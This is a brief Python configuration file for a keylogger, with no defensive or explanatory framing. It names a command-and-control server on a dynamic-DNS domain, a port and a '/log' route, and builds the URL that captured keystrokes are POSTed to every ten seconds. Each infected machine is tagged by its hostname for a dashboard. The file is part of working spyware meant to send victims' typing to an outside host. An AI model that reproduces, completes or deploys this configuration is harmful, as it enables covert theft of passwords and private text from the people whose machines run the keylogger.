# C2 Server Configuration
import socket
C2_HOST = "retrodomain.duckdns.org"   
C2_PORT = 8080                  # must match server.py
C2_ENDPOINT = "/log"            # the route that receives data

# Full URL the keylogger will POST to
C2_URL = f"{C2_HOST}:{C2_PORT}{C2_ENDPOINT}"

# Keylogger Configuration
SEND_INTERVAL = 10              # send captured keys every X seconds
MACHINE_ID = socket.gethostname()   # identifier for this machine in the dashboards